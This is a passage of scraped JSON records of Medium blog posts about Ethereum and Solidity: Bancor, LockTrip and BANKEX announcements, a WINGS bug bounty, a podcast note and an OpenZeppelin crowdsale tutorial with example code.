\u043f\u0440\u043e\u0434\u0443\u043a\u0442\u044b \u0441 \u043a\u043e\u043d\u0446\u0430 \u0434\u0435\u0432\u044f\u043d\u043e\u0441\u0442\u044b\u0445. \u0421\u0440\u0435\u0434\u0438 \u043d\u0430\u0448\u0438\u0445 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0439 \u0447\u0438\u0441\u043b\u0438\u043b\u0438\u0441\u044c Contact Networks, MetaCafe, Mytopia, Particle Code \u0438 AppCoin. \u041c\u044b \u043d\u0430\u0442\u043e\u043b\u043a\u043d\u0443\u043b\u0438\u0441\u044c \u043d\u0430 \u0411\u0438\u0442\u043a\u043e\u0438\u043d \u0432 2011 \u0433\u043e\u0434\u0443 \u0438 \u043d\u0430\u0447\u0430\u043b\u0438 \u0438\u0441\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u044c \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u0430\u043b\u044e\u0442, \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\u043c\u0438. \u0421\u043b\u0435\u0434\u0443\u044f \u0437\u0430 \u0432\u044b\u043f\u0443\u0441\u043a\u043e\u043c \u042d\u0444\u0438\u0440\u0438\u0443\u043c\u0430 \u0432 2015 \u0433\u043e\u0434\u0443, \u043c\u044b \u043f\u043e\u043d\u044f\u043b\u0438, \u0447\u0442\u043e \u0441\u043c\u0430\u0440\u0442-\u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u044b \u0438\u0437\u043c\u0435\u043d\u0438\u043b\u0438 \u043f\u0440\u0430\u0432\u0438\u043b\u0430 \u0438\u0433\u0440\u044b \u0438 \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0442 \u0441\u043e\u0437\u0434\u0430\u0432\u0430\u0442\u044c \u0441\u0432\u043e\u0438 \u0432\u0430\u043b\u044e\u0442\u044b \u0432 \u0448\u0438\u0440\u043e\u043a\u043e\u043c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u0435. \u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u0443\u0435\u043c\u044b\u0435 \u043c\u043e\u0434\u0443\u043b\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0440\u0435\u0433\u0443\u043b\u0438\u0440\u0443\u044e\u0442 \u0438 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044c (\u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c\u0443\u044e \u0442\u043e\u043a\u0435\u043d\u0430\u043c\u0438), \u043c\u043e\u0433\u0443\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0442\u044c \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u044b, \u043e\u0442\u043d\u043e\u0441\u044f\u0449\u0438\u0435\u0441\u044f \u043a \u0434\u0430\u043d\u043d\u043e\u0439 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438, \u0437\u0430 \u043c\u0438\u0437\u0435\u0440\u043d\u0443\u044e \u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u044c \u2014 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u044b \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u044e\u0442\u0441\u044f \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u044b\u043c\u0438 \u043e\u0440\u0433\u0430\u043d\u0438\u0437\u0430\u0446\u0438\u044f\u043c\u0438 (\u043d\u0430\u043f\u0440. \u0443\u0441\u043b\u0443\u0433\u0438 \u0433\u0430\u0440\u0430\u043d\u0442\u0430, \u0431\u0438\u0440\u0436\u0438, \u044e\u0440\u0438\u0441\u0442\u044b). \u041e\u0434\u043d\u0430\u043a\u043e \u043d\u0435 \u0442\u0430\u043a\u0438\u043c \u043f\u0440\u043e\u0441\u0442\u044b\u043c \u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0441\u0430\u043c\u043e\u0441\u0442\u043e\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u043a\u043e\u0434\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0446\u0438\u0444\u0440\u043e\u0432\u044b\u043c\u0438 \u0434\u0435\u043d\u044c\u0433\u0430\u043c\u0438 \u0441 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u043c \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043e\u043c \u043e\u0431\u043c\u0435\u043d\u0430 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u044f\u043c\u0438.\u041b\u0435\u0442\u043e\u043c 2016 \u0433\u043e\u0434\u0430, \u043c\u044b \u043d\u0430\u0447\u0430\u043b\u0438 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0430\u0434 Bancor \u0441 \u0446\u0435\u043b\u044c\u044e \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0438\u0435\u0440\u0430\u0440\u0445\u0438\u0447\u0435\u0441\u043a\u0443\u044e \u043c\u043e\u043d\u0435\u0442\u0430\u0440\u043d\u0443\u044e \u0441\u0438\u0441\u0442\u0435\u043c\u0443 (\u0433\u0434\u0435 \u043e\u0434\u0438\u043d \u0446\u0438\u0444\u0440\u043e\u0432\u043e\u0439 \u0442\u043e\u043a\u0435\u043d \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0432 \u0441\u0432\u043e\u0451\u043c \u0440\u0435\u0437\u0435\u0440\u0432\u0435 \u0434\u0440\u0443\u0433\u0438\u0435 \u0442\u043e\u043a\u0435\u043d\u044b), \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u0432\u0438\u0434 \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u0430 \u0432 \u043a\u0440\u0438\u043f\u0442\u043e\u0432\u0430\u043b\u044e\u0442\u0430\u0445, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043b\u044f\u0436\u0435\u0442 \u0432 \u0444\u0443\u043d\u0434\u0430\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0432\u0441\u0435\u043c\u0438\u0440\u043d\u043e\u0433\u043e \u0434\u0435\u0446\u0435\u043d\u0442\u0440\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u043c\u0435\u043d\u0430. \u042d\u0442\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0430\u0432\u0442\u043e\u043d\u043e\u043c\u043d\u0430, \u043d\u0435 \u0438\u043c\u0435\u0435\u0442 \u0441\u043f\u0440\u0435\u0434\u0430, \u0431\u0435\u0437 \u0440\u0438\u0441\u043a\u0430 \u043f\u043e\u0441\u0440\u0435\u0434\u043d\u0438\u043a\u043e\u0432 \u0438 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u0443\u044e \u043b\u0438\u043a\u0432\u0438\u0434\u043d\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u043b\u044e\u0431\u043e\u0433\u043e \u0430\u0441\u0441\u0435\u0442\u0430. \u042d\u0442\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0441\u043e\u0437\u0434\u0430\u0441\u0442 \u201c\u0434\u043b\u0438\u043d\u043d\u044b\u0439 \u0445\u0432\u043e\u0441\u0442\u201d \u0434\u043b\u044f \u0432\u0430\u043b\u044e\u0442, \u043f\u043e \u043f\u0440\u0438\u043c\u0435\u0440\u0443 \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0434\u0435\u043b\u0430\u043b \u0442\u0430\u043a \u0436\u0435 \u0441 \u043a\u043e\u043d\u0442\u0435\u043d\u0442\u043e\u043c.\u041c\u044b \u0445\u043e\u0442\u0435\u043b\u0438 \u0431\u044b \u043f\u043e\u0434\u0435\u043b\u0438\u0442\u044c\u0441\u044f \u0441 \u0432\u0430\u043c\u0438, \u0418\u043d\u0442\u0435\u0440\u043d\u0435\u0442, \u043d\u0430\u0448\u0435\u0439 \u0447\u0435\u0440\u043d\u043e\u0432\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0435\u0439 whitepaper \u043d\u0430 \u0432\u0430\u0448\u0435 \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u043d\u0438\u0435 \u0438 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0438. \u0412\u0441\u0435 \u043e\u0442\u0437\u044b\u0432\u044b \u043f\u0440\u0438\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0442\u0441\u044f \u0438 \u043e\u0447\u0435\u043d\u044c \u0446\u0435\u043d\u044f\u0442\u0441\u044f.\u041a\u043e\u043c\u0430\u043d\u0434\u0430 Bancorhttp://bancor.network", "responses": 0, "tags": ["Bitcoin", "Blockchain", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "", "post_link": "https://medium.com/locktrip/we-are-excited-to-announce-our-partnership-with-softuni-a687df4a996a?source=search_post", "author_name": "LockTrip.com (LOC Token) Official Blog", "author_link": "https://medium.com/@LockChainCo", "publish_date": "2017-11-15", "last_modified_date": "2018-12-05", "readtime": "1.07", "claps": 36, "voters": 3, "content": "LockTrip.com (LOC Token) Official BlogFollowNov 15, 2017 \u00b7 2 min readWe are excited to announce our partnership with SoftUni.SoftUni was created by our founder Hristo Tenchev and technology advisor Svetlin Nakov back in 2014, to what has now become one of the leading Technology Academies in Bulgaria.Nakov has a long background in building tech acadamies. He was the main power behind Telerik Academy, with over 9000 people completing their courses. Tenchev, also a programmer himself, joined Nakov in building SoftUni, where it now holds over 50 educational programming courses per year.It was just six months ago, when Aeternity had announced their partnership with SoftUni, to educate BlockChain technology in Bulgaria, via courses and seminars.SoftUni is now offering several courses around Solidity (Ethereum\u2019s programming language), with 400+ enrolled developers.Having SoftUni as our partner and backbone, allows us to dive into what will be one of the largest (global) pool of certified Solidity Developers, to keep expanding LockChain\u2019s footprint on Ethereum\u2019s platform.Bulgaria has a strong potential to become a powerhouse in the blockchain industry, due to the support and growth of a very talented software development community.Our advisor and Aeternity founder, Vladislav Dramaliev, holds a bi-monthly crypto-meetup with over 2000 attendees. A growth of 100x since last year.We see great things coming our way with the support of SoftUni!You can reach us on the following channels:Telegram | Twitter | Facebook | Mail", "responses": 0, "tags": ["Blockchain", "ICO", "Solidity", "Lockchain", "Ethereum"]}, {"title": "The WINGS Bug Bounty Program", "post_link": "https://blog.wings.ai/the-wings-bug-bounty-program-fddfef2369da?source=search_post", "author_name": "WINGS Magazine", "author_link": "https://blog.wings.ai/@wings.ai", "publish_date": "2018-02-13", "last_modified_date": "2018-05-21", "readtime": "1.74", "claps": 44, "voters": 4, "content": "The WINGS Bug Bounty ProgramHelp and earn rewards up to 5000 WINGSWINGS MagazineFollowFeb 13, 2018 \u00b7 2 min readCalling all security specialistsWe are about to finally launch the mainnet version of WINGS and need your peering eyes combing through the code and finding anything that us and our auditing partners might have missed.The bounty reward is up to 1000 WINGS for issues requiring beta re-deploy, and up to 5000 WINGS for critical issues, all payable in WINGS tokens.500 WINGS: For any severe bugs that don\u2019t require contracts redeploy1,000 WINGS: Any bugs leading to stopping using the current contracts and having to redeploy the new version to the testnet2,500 WINGS reward for bugs allowing any first party to break into their own fundsExample: WINGS tokens owner can transfer the forecast tokens despite them being locked5,000 WINGS reward for bugs allowing any 3rd party to access fundsExample: Anyone can transfer the WINGS tokens in the contractWe follow the bounty rules established by Ethereum Foundation: https://bounty.ethereum.org, such as first come, first serve; any reports submitted by others or already known to the team will not be rewarded.Testnet siteThe testnet is accessible on the following address:https://testnet.wings.aiBounty scopeActual financial losses issues:Impossibility of closing a forecast and getting the locked Wings backImpossibility of getting deposited Wings during project creation backIncorrect calculations of the Ethereum transaction feesCalculations issues:Incorrect calculation and distribution of rewardsWrong distribution of project deposit fee (in case of project rejection or cancellation)Wrong calculation of FRFlow issues:Deadlock of projectSecurity issues:Vulnerabilities (for example: XSS attack)Other issuesBack-end/front-end related issues:Incorrect responses from the APIAny other issue that might prevent the correct platform useNote that some actions could ask for a different gas parameters, so before reporting an issue, test it with a different gas limitOut of scope:Browsers bugsAny UX issues on the platformText and grammarSubmission deadlineThe bug bounty ends on 11/3/2018.Responsible DisclosureWe ask you to follow a responsible disclosure:Provide reasonable time to resolve any issues you report before making them public or sharing with anyone elseAvoid violations and disruptions to anyone with the knowledge you gainedNot exploit the security issue, including for demonstration purposesContactPlease send your findings to: bounty@wings.ai, feel free to make the submissions anonymous.Make sure to include your ETH address for receiving your reward.", "responses": 0, "tags": ["Bounty Program", "Bugs", "Wings", "Ethereum", "Solidity"]}, {"title": "Episode 35: Deciphering What\u2019s New, with NuCypher", "post_link": "https://medium.com/blockchannel/episode-35-deciphering-whats-new-with-nucypher-aff3776cf958?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-12-17", "last_modified_date": "2018-03-13", "readtime": "0.86", "claps": 64, "voters": 5, "content": "Episode 35: Deciphering What\u2019s New, with NuCypherWith Guests John Pacific & Michael EgorovSteven McKieFollowDec 17, 2017 \u00b7 1 min readPress Play!On this episode of BlockChannel, Mckie and Petty sit down with John Pacific and Michael Egorov of the NuCypher project to learn more about their upcoming protocol token for encryption services. Their platform enables users to create key-based authentication to create permissioned access to platforms and services that are created by other DApp developers by utilizing Ethereum smart contracts. Think of it like Keybase\u2026but for enterprise and developers looking to more easily shield and protect their personal data. It\u2019s a great project with a lot of potential and these guys really know their stuff \u2014 so we dove in to get to the bottom of their vision.Show Links:NuCypher Site: https://www.nucypher.com/NuCypher Telegram: t.me/nucypherIntro/Outro Music \u201cPart Two\u201d by Meech: https://soundcloud.com/ovaeastmeech/part-two?in=ovaeastmeech/sets/truecoloursShow Sponsor(s):Bitcoin Cash: https://bitcoincash.orgDisclaimer: This is not investment advice, it is an engaged discussion on new technology; BlockChannel reminds you to always do your own due diligence before investing in any crypto-related project in the industry.", "responses": 0, "tags": ["Startup", "Ethereum", "Blockchanneltv", "Encryption", "Solidity"]}, {"title": "BANKEX Monthly Update: August 2018", "post_link": "https://blog.bankex.org/bankex-monthly-update-august-2018-c82606265430?source=search_post", "author_name": "BANKEX", "author_link": "https://blog.bankex.org/@bankexcom", "publish_date": "2018-09-06", "last_modified_date": "2018-09-06", "readtime": "5.02", "claps": 203, "voters": 5, "content": "BANKEX Monthly Update: August 2018BANKEXFollowSep 6, 2018 \u00b7 6 min readThe last month of summer has come to an end. It\u2019s time to look back on everything BANKEX achieved in August. Over this past month, we launched BANKEX Pay for Ethereum transactions, released the mobile version of BANKEX Scan, presented the tokenized YouTube channel, and listed our utility token on Coinswitch.co, one of the world\u2019s largest cryptocurrency exchange aggregators.New Tech and ServicesBANKEX PayThis month, our team launched BANKEX Pay \u2014 a powerful and easy-to-use Ethereum wallet, customized for iOS devices. It\u2019s a robust solution that enables you to make transactions, estimate gas costs, and generate receipts.Use BANKEX Pay to easily store, send, and receive crypto assets, all from your iOS device. The wallet can also store ERC-20 and ERC-223 tokens. Going forward, expect BANKEX Pay to support a wide range of tokens, including ERC-721 and ERC-888. The app has an intuitive interface that makes it an ideal wallet for crypto newbies and experienced crypto traders alike.The app also offers top-notch security. It employs a native API as well as BANKEX\u2019s own Web3swift library to interact with the blockchain. In addition, the wallet uses a digital signature for transactions while the library itself stores keys. Users\u2019 private keys are protected from jailbreaks and root rights, so they will be as secure as on a hard wallet. The BANKEX Pay app for iOS can be downloaded here.BANKEX Pay Comes to iOSMobile wallets take the concept of crypto wallets and make them more convenient and accessible; no matter where a user\u2026blog.bankex.orgMobile Version of BANKEX ScanBANKEX Scan is a service that can search for Ethereum transactions by address, TxHash, or block number. It also can return transaction details such as ETH volume, fees, block number, sender/recipient address, transaction time, and whether the transaction was successful. This makes it similar to other Ethereum scanning solutions, but with an important added feature: it can also scan ERC-721 tokens and display their balances. This information will be displayed separately from other transaction data. BANKEX Scan for Android tablets and smartphones is up on Google Play. Get the same exact functionality as the web version \u2014 easy access to information on the Ethereum blockchain \u2014 now on your mobile device.BANKEX Scan Expands Users\u2019 Horizons as Well as its OwnFor the uninitiated, any sort of blockchain implementation can seem abstruse, as if extracting information quickly and\u2026blog.bankex.orgTechHives \u2014 The First Tokenized Youtube ChannelTechHives is a trending YouTube channel dedicated to infotainment about tech for non-tech people. With the help of BANKEX MediaToken, TechHives has become the first tokenized YouTube account and is now attracting contributors from all over the world. MediaToken provides contributors with full access to all social media channel performance metrics, offering detailed account analysis, including real-time reports on likes, views, shares, and other indicators. Channel owners report their income and expenses. As tokenized channels grow and attract advertisers, token holder revenue increases. In exchange, bloggers and social media channel owners get the funds they need to develop their channel. The MediaToken funding model sidesteps bank loan applications, intermediaries, and high financing fees. Instead, MediaToken offers security, simple automated processes, and rapid growth.New Exchange AggregatorAfter the successful launch of several new products and services, BANKEX\u2019s founders have decided that it\u2019s time to make the BKX utility token more accessible to potential token holders. To put this into practice, we have worked to get BKX listed on a number of large crypto exchanges and exchange aggregators. This month, BANKEX established a partnership with Coinswitch.co \u2014 the world\u2019s leading cryptocurrency exchange aggregator platform, with 250+ coins and 6000+ currency pairs. As of 2018, it has been hitting a volume of 1 million USD per day. Among the exchanges listed on Coinswitch.co are Bittrex, Changelly, Shapeshift, and Cryptopia.BANKEX Among Top 3 Supported Currencies on CoinSwitchBANKEX has announced the listing of its BKX token on CoinSwitch, a cryptocurrency and altcoin exchange aggregator\u2026blog.bankex.orgTechThis August we explained 9 vulnerabilities of Smart Contracts that everyone should know.Nine Pitfalls of Ethereum Smart Contracts to Be Avoided:A Clear Explanation of Vulnerabilitiesblog.bankex.orgMediaHow Banks Can Become Blockchain Innovators-or Fall BehindTechnology Blockchain Disruption Founder and CEO of BANKEX At its simplest, a blockchain-based currency such as bitcoin\u2026www.brinknews.comThe First Tokenization Of a YouTube Channel is Completed Successfully With BANKEX MediaToken \u2026The First Tokenization Of a YouTube Channel is Completed Successfully With BANKEX MediaToken Trending YouTube channel\u2026www.investinblockchain.comBANKEX opens the way to get citizenship via cryptocurrency investment - AMBCrypto30 July 2018, New York- BANKEX, in association with the MIGRONIS KFT immigration company, the MDL Legal Services PLLC\u2026ambcrypto.com6 Month Recap: What Comes Next After Bankex Successful Token Sale - Fintech Hong KongUndoubtedly, the year 2017 was the \"Year of Crypto.\" While the word \"bitcoin\" became one of the most popular Google\u2026fintechnews.hkPress Release: BANKEX Pay Ethereum Wallet, Store Tokens and Make Transactions Available Now in the\u2026BANKEX Pay is a user-friendly Ethereum wallet that securely stores crypto assets, enables users to make transactions\u2026www.trustnodes.comBANKEX Custody Service - Your Personal Crypto Vault-AMBCryptoBANKEX has launched Custody Service, a blockchain-based cryptocurrency storage solution with no minimum deposit limit\u2026ambcrypto.comNew EventsIn August BANKEX visited the IFC \u2014 International Finance Corporation World Bank Group Headquarters Headquarters to help promote the application of blockchain technology in global supply chains.BANKEX Team attended the Ethereum Bangkok Community Meetup to present our groundbreaking technologies and bond with fellow blockchain-based companies, such as OmiseGO.Blockchain Education: BANKEX Foundation School conducted a 4-day Intensive Course on SolidityBANKEX Foundation developers Artem Vorobyev, Kirill Kuznetsov, and Nikita Kozlov broke down the complex world of smart contracts in a solidity course that consisted of 20 hours of lectures and practical learning. Each student received a unique certificate upon completion.What to Expect in SeptemberWe continue working non-stop to merge real-life assets with blockchain technology.BANKEX Foundation team is participating in ETH Berlin Hackathon:Ethereum Industry SummitETHIS\uff08Ethereum Industry Summit\uff09is a nonprofit global conference organized by LinkTime, a company that is part of the\u2026ethis.ioThe first month of Autumn will be very eventful, as we are launching a number of major blockchain products and technologies.Stay tuned!We love to interact with our blockchain community, so feel free to contact us with any questions you may have. We are always glad to meet new people interested in fintech and explain how this crypto stuff works and make new friends.In the BANKEX Monthly Update, we publish news and notes about the hardworking BANKEX team, its professional activities, and achievements. We also announce plans for initiatives and milestones towards realizing ongoing projects and goals, and we\u2019ll share information about BANKEX\u2019s participation in events in fintech, blockchain, and other spheres.", "responses": 0, "tags": ["Blockchain", "Updates", "Ethereum", "Solidity", "Events"]}, {"title": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library \u2014 Part 2", "post_link": "https://medium.com/crowdbotics/how-to-build-a-simple-capped-crowdsale-token-using-openzeppelin-library-part-2-cf96cb66c3d0?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-10-22", "last_modified_date": "2019-06-12", "readtime": "5.13", "claps": 52, "voters": 3, "content": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library \u2014 Part 2Using Open-Zeppelin Library to build a basic capped ERC20 crowdsale.Gaurav AgrawalFollowOct 22, 2018 \u00b7 6 min readIn Part 1, we built a capped ExampleToken. In this article, we will dive into crowdsale contract ExampleTokenCrowdsale and understand it\u2019s inner workings.Lets first look at our imported contracts from the open zeppelin-solidity library.Crowdsale.solThis contract implements the core crowdsale functionality. There are a few global variables.ERC20 token \u2014 As you can see, this token is inheriting ERC20.sol. This variable will contain the address of our ExampleToken contract.wallet \u2014 This will store address where ether contributions will get collected.rate \u2014 This will store how many token units a buyer gets per wei.weiRaised- How many wei get raised via contribution.This contract also defines a constructor which is getting used by our ExampleTokenCrowsale.sol. The most important method of this contract is buytokens(_beneficiary). Most of the functions in this contract are getting called by this method, it performs these tasks:Pre-validation, if we have any conditionProcess purchase (Transferring token)Update different states (ex- wei increased)Post validation if requiredpragma solidity ^0.4.24;import \"../token/ERC20/ERC20.sol\";import \"../math/SafeMath.sol\";import \"../token/ERC20/SafeERC20.sol\";contract Crowdsale {  using SafeMath for uint256;  using SafeERC20 for ERC20;ERC20 public token;address public wallet;uint256 public rate;uint256 public weiRaised;event TokenPurchase(    address indexed purchaser,    address indexed beneficiary,    uint256 value,    uint256 amount  );constructor(uint256 _rate, address _wallet, ERC20 _token) public {    require(_rate > 0);    require(_wallet != address(0));    require(_token != address(0));rate = _rate;    wallet = _wallet;    token = _token;  }function () external payable {    buyTokens(msg.sender);  }function buyTokens(address _beneficiary) public payable {uint256 weiAmount = msg.value;    _preValidatePurchase(_beneficiary, weiAmount);uint256 tokens = _getTokenAmount(weiAmount);weiRaised = weiRaised.add(weiAmount);_processPurchase(_beneficiary, tokens);    emit TokenPurchase(      msg.sender,      _beneficiary,      weiAmount,      tokens    );_updatePurchasingState(_beneficiary, weiAmount);_forwardFunds();    _postValidatePurchase(_beneficiary, weiAmount);  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    require(_beneficiary != address(0));    require(_weiAmount != 0);  }function _postValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    // optional override  }function _deliverTokens(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    token.safeTransfer(_beneficiary, _tokenAmount);  }function _processPurchase(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    _deliverTokens(_beneficiary, _tokenAmount);  }function _updatePurchasingState(    address _beneficiary,    uint256 _weiAmount  )    internal  {    // optional override  }function _getTokenAmount(uint256 _weiAmount)    internal view returns (uint256)  {    return _weiAmount.mul(rate);  }function _forwardFunds() internal {    wallet.transfer(msg.value);  }}MintedCrowdsale.solThis contract gets called through crowdsale.sol contract and will call mintableToken\u2019s mint() function to manage token minting as we have discussed in last tutorials.pragma solidity ^0.4.24;import \"../Crowdsale.sol\";import \"../../token/ERC20/MintableToken.sol\";contract MintedCrowdsale is Crowdsale {function _deliverTokens(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    require(MintableToken(address(token)).mint(_beneficiary, _tokenAmount));  }}CappedCrowdsale.solThis contract is responsible for managing capping functionality and we will extend this contract to put the cap on investors contributions. We will also define the maximum total ether contribution cap using this contract.pragma solidity ^0.4.24;import \"../../math/SafeMath.sol\";import \"../Crowdsale.sol\";contract CappedCrowdsale is Crowdsale {  using SafeMath for uint256;uint256 public cap;constructor(uint256 _cap) public {    require(_cap > 0);    cap = _cap;  }function capReached() public view returns (bool) {    return weiRaised >= cap;  }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    super._preValidatePurchase(_beneficiary, _weiAmount);    require(weiRaised.add(_weiAmount) <= cap);  }}Capping investors contributionNow let\u2019s write our logic for capping investors contribution, We will accept minimum 2 ether and maximum 50 ether from an investor.uint256 public investorMinCap = 2000000000000000000; uint256 public investorHardCap = 50000000000000000000;mapping(address => uint256) public contributions;constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap) public{ }function _preValidatePurchase(    address _beneficiary,    uint256 _weiAmount  )    internal  {    super._preValidatePurchase(_beneficiary, _weiAmount);  uint256 _existingContribution = contributions[_beneficiary];  uint256 _newContribution = _existingContribution.add(_weiAmount);require(_newContribution >= investorMinCap && _newContribution <= investorHardCap);contributions[_beneficiary] = _newContribution;}We have defined investorMinCap (2 ether in wei) and investorMaxCap(50 ether in wei), We also defined mapping contributions to track investors contribution. We are calling super at the first line, so if any contract will inherit this contract, will be able to execute it\u2019s _preValidatePurchase() method first. Then we are checking the condition for capping investors and at the end updating contribution in our mapping.require(_newContribution >= investorMinCap && _newContribution <= investorHardCap);This way we have now put a cap on investors contribution.Capping Total ether raisedNow let\u2019s look at ExampleTokenCrowdsale constructor. Here we are setting 4 parameters._rate_wallet_token_cap \u2014 This will define cap on ether contribution.We will set these methods while deploying the contract.constructor(uint256 _rate,   address _wallet,   ERC20 _token,   uint256 _cap) Crowdsale(_rate, _wallet, _token) CappedCrowdsale(_cap) public{ }That\u2019s it, We successfully created a capped crowdsale contract. Now, let\u2019s test it, we have discussed testing smart contract in our last series of solidity Curd app.Testing Crowdsale ContractLet\u2019s run some commands to test our smart contract.truffle compiletruffle developmigrate --resetLet\u2019s deploy our ExampleToken contract, Look we are passing our token name, symbol and decimal point for our smart contract.ExampleToken.deployed(\"Example Token\", \"EXM\", 18).then((t) => {token = t;})Now deploy our ExampleTokenCrowdsale contract. We are passing our 4 parameters here rate(500 token / ether), wallet( web3.eth.accounts[0]) , ERC20 token(Example Token address) and cap (200 ether).ExampleTokenCrowdsale.deployed(500, web3.eth.accounts[0], token.address , new web3.BigNumber(web3.toWei(200, 'ether'))).then((t) => {sale = t;})Before buying tokens from our crowdsale contract, we need to perform a small step, We need to transfer ownership of token contract to crowdsale contract so it can mint tokens. Check MintableToken.sol and you will understand why we are performing this step.token.transferOwnership(sale.address)Now let check our investor cap constraint, We will perform 4 transactions.As our minimum contribution cap is 2 ether. First, we will try to buy tokens with 1 ether. It should fail.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(1, 'ether')) , from : web3.eth.accounts[1]});2. Now we will buy tokens with 2 ether, it should succeed.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(2, 'ether')) , from : web3.eth.accounts[1]});3. Now we will buy tokens with 48 ether from the same investor account. It should passsale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(48, 'ether')) , from : web3.eth.accounts[1]});4. Now if we try to buy any more tokens from the same account it should fail.sale.buyTokens(web3.eth.accounts[1], {value : new web3.BigNumber(web3.toWei(1, 'ether')) , from : web3.eth.accounts[1]});You can check the total supply and balance of the account in the middle as you feel comfortable, you will be able to see that total supply is getting increased as we are buying tokens.token.balanceOf(web3.eth.accounts[1]).then(result => result.toNumber())In the same way, you can test the hard cap of our crowdsale by buying tokens from the different account. Let me know how it went. You don\u2019t need to test open-zeppelin contracts as they are well tested already.ConclusionSo we have created our capped token and crowdsale contract, We learned how to use open-zeppelin library and how we can use them to build an ERC20 token. We have also learned inner workings of different open-zeppelin library contracts.You can also add additional constraints such as adding a time limit for sale and deciding when sale should start or end. Which we will cover in the next part of our tutorial series.Notes & SuggestionsA small bug can turn the whole project upside down. Using libraries like Open-zeppelin helps here by providing some fully tested core functionality of an ERC20 token.If you have questions about any part of the tutorial, feel free to ask questions on the comments section. Go through open-zeppelin\u2019s library and let me know what you want to learn next.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 2, "tags": ["Ethereum", "Tutorial", "Smart Contracts", "Openzeppelin", "Solidity"]}, {"title": "Binary Search Trees and Order Statistics in Solidity for Ethereum", "post_link": "https://medium.com/hackernoon/binary-search-trees-and-order-statistics-for-ethereum-db47e2dd2c36?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2019-03-06", "last_modified_date": "2019-03-06", "readtime": "9.33", "claps": 23, "voters": 4, "content": "Binary Search Trees and Order Statistics in Solidity for EthereumFinite Trees for Infinite SetsRob HitchensFollowMar 6 